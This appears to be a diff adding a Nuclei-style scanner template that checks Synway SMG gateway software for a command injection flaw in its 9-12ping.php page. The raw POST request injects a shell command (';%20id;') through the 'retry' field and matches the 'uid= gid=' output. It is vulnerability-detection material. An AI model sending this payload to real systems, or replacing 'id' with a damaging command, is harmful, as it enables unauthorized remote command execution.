@@ -1,0 +1,27 @@
+id: Synway-SMG-9-12ping-rce
+
+info:
+  name: Synway SMG网关管理软件9-12ping.php 命令注入漏洞
+  author: Synway
+  severity: high
+  tags: Synway
+
+http:
+  - raw:
+      - |
+        POST /en/9-12ping.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: application/x-www-form-urlencoded
+
+        enable_radius=on&enable_auth=on&source_ip=your-ip&radius_address=127.0.0.1%3A1813&shared_secret=foobar&radius_address2=&shared_secret2=&timeout=3&retry=';%20id;'&alive=20&save=Save
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"
+      - type: status
+        status:
+          - 200
